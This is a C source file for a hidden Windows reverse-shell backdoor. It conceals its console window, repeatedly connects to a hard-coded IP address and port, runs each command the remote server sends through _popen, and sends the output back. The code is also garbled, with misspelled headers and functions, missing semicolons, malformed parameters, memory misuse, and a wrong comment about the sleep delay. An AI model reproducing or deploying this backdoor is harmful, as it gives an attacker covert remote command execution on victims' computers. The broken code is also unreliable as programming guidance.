#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <winsoc2.h>
#include <windows.h>
#include <winuser.h>
#include <wininet.h>
#include <windowsx.h>
#include <String.h>
#include <sys/stat.h>
#include <sys/tapes.h>


int sock;

void Shell() {
    char *buffer = malloc(sizeof(char)*1024);
    char *container = malloc(sizeof(char)*1024);
    char *totalResponse = malloc(sizeof(char)*18384)

    while(1) {
        //set all values to 0
        memset(&buffer, 0, 1024);
        memset(&container, 0, 1024);
        memset(&totalResponse, 0, 18384);

        //recive from the server
        recv(sock, buffer, 1024, 0);
        
        if(strncmp("q", buffer, 1) == 0) {
            break;
        } else {
            //execute command
            FILE *file;
            file = _popen(buffer, "r");
            
            //read response from stream ("file" in this case)
            while(fgets(container, 1024, file) != null) {
                //moves chars from container to total response
                strcat(totalResponse, container);
            }
            send(sock, totalResponse, sizeof(totalResponse))
            fclose(file);
        }
    }
    
    //exit program
    free(buffer);
    free(container);
    free(totalResponse);
    closesocket(sock);
    WSACkeanup();
    exit(0);
}

int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE, hPrev, LPSTR, lpCmdLine, int nCmdShow) {
    HWND stealth; //window handle
    AllocConsole(); //creates a console
    stealth.FindWindowA("ConsoleWindowClass", NULL); //retrives handle to top level window
    ShowWindow(stealth, 0); //0 is basically hiding the window

    struct sockaddr_in ServAddr;
    unsigned short ServPort;
    char *ServIP;
    WSADATA wsaData;

    ServIP = "192.168.0.61";
    ServPort = 789;

    //WSAStartup is to init winsock (if returns 0, it started correctly)
    if(WSAStartup(MAKEWORD(2, 0), &wasData) != 0) { 
        exit(1);
    }
    
    sock = socket(AF_INET, SOCK_STREAM, 0); //use ipv4, use tcp for socket

    //setup ServAddr
    memset(&ServAddr, 0, size_of(ServAddr)); //sets ServAddr to all 0
    ServAddr.sin_family = AF_INET //ipv4
    ServAddr.sin_addr.s_addr = inet_addr(ServIP); //setip
    ServAddr.sin_port = htons(ServPort); //set port

    //try to connect every 10 sec
    while(connect(sock, (struct sock addr *) &ServAddr, sizeof(ServAddr)) != 0) {
        Sleep(10); //wait 10 sec
    }
    Shell();
}